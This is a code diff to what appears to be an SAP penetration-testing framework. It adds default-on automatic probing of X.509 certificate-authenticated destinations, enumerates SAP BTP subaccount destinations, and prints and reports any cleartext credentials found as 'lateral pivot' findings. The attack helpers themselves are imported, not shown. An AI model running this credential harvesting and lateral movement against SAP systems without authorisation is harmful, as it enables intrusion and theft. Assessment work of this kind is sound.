@@ -8549,6 +8549,13 @@ def create_app(api: SAPMAPApi) -> Bottle:
         node = api.state.get_node(sid)
         if not node:
             return json.dumps({"error": f"Node {sid} not found"})
+        # Auto-probe cert-auth destinations at the end of retrieval.
+        # Default ON — the operator explicitly hit "Retrieve RFCs" and
+        # is clearly interested in downstream lateral targets.  Scripts
+        # can opt out by passing ``auto_probe_cert_auth: false``.
+        data = request.json or {}
+        auto_probe_cert_auth = data.get(
+            "auto_probe_cert_auth", True) is not False
 
         def _run():
             creds = node.best_credentials()
@@ -9076,6 +9083,95 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     node.rfcsysacl_entries = acl
             except Exception as e:
                 logger.debug(f"RFCSYSACL read failed for {sid}: {e}")
+
+            # ---- Auto-probe cert-auth destinations ----
+            # For every X.509 edge discovered above, fire the kernel-
+            # proxied HTTP primitive.  BTP-shaped targets get the
+            # subaccount-destinations enumeration; other targets get a
+            # plain GET / for reachability.  Skipped when the operator
+            # explicitly turned this off (auto_probe_cert_auth=false).
+            if auto_probe_cert_auth:
+                _cert_edges = [
+                    c for c in api.state.get_connections_from(sid)
+                    if c.http_auth_type == "X509"]
+                if _cert_edges:
+                    print(f"[*] {sid}: auto-probing {len(_cert_edges)} "
+                           f"cert-auth destination(s) via the kernel-"
+                           f"proxy primitive")
+                try:
+                    from sap_http_via_dest import (
+                        call_via_destination,
+                        enumerate_btp_subaccount_destinations,
+                        HttpViaDestError)
+                except Exception as _ie:
+                    print(f"[-] {sid}: cert-auth auto-probe skipped — "
+                           f"could not import primitive: {_ie}")
+                    _cert_edges = []
+                for _c in _cert_edges:
+                    _dest = _c.destination_name
+                    _is_btp = "hana.ondemand.com" in (_c.http_url or "")
+                    try:
+                        if _is_btp:
+                            _r = enumerate_btp_subaccount_destinations(
+                                node, _dest, creds=creds)
+                            if not _r["ok"]:
+                                print(f"[-] {sid}: {_dest}: BTP enum "
+                                       f"failed — "
+                                       f"{_r.get('error', '?')}")
+                                continue
+                            print(f"[+] {sid}: {_dest}: BTP returned "
+                                   f"{_r['count']} destination(s), "
+                                   f"{len(_r['cleartext'])} carry "
+                                   f"cleartext secrets")
+                            for _hit in _r["cleartext"]:
+                                print(f"[!] {sid}: cleartext "
+                                       f"{_hit['field']} in BTP dest "
+                                       f"{_hit['name']!r} → "
+                                       f"{_hit['target_url']}")
+                            if _r["cleartext"]:
+                                emit_finding(
+                                    "CRITICAL", sid,
+                                    f"Auto-probe of {_dest} extracted "
+                                    f"{len(_r['cleartext'])} cleartext "
+                                    f"on-prem credential(s) from BTP "
+                                    f"subaccount destinations — "
+                                    f"lateral pivot back to on-prem.",
+                                    attack_capability=(
+                                        "lateral.btp_cert_proxy"))
+                            elif _r["count"]:
+                                emit_finding(
+                                    "HIGH", sid,
+                                    f"Auto-probe of {_dest} reached "
+                                    f"BTP subaccount destination "
+                                    f"service ({_r['count']} dests) "
+                                    f"— on-prem X.509 identity works "
+                                    f"against BTP management APIs.")
+                        else:
+                            _r = call_via_destination(
+                                node, _dest, method="GET", path="/",
+                                creds=creds)
+                            if _r["ok"]:
+                                print(f"[+] {sid}: {_dest}: HTTP "
+                                       f"{_r['status']} "
+                                       f"({len(_r['body'])} B body)")
+                                emit_finding(
+                                    "HIGH", sid,
+                                    f"Auto-probe of {_dest} → "
+                                    f"{_c.http_url}: HTTP "
+                                    f"{_r['status']}.  Source X.509 "
+                                    f"identity (PSE "
+                                    f"{_c.http_cert_pse or '?'}) works.")
+                            else:
+                                print(f"[-] {sid}: {_dest}: "
+                                       f"{_r.get('error', '?')}")
+                    except HttpViaDestError as _pe:
+                        print(f"[-] {sid}: {_dest}: input validation "
+                               f"blocked probe — {_pe}")
+                    except Exception as _pe:
+                        # Never fail the whole retrieval on one bad
+                        # cert-probe.  Log and keep going.
+                        print(f"[-] {sid}: {_dest}: auto-probe failed "
+                               f"— {_pe}")
 
         _bg(f"{sid}:retrieve_rfcs", "Retrieve RFCs", _run)
         return json.dumps({"status": "started"})
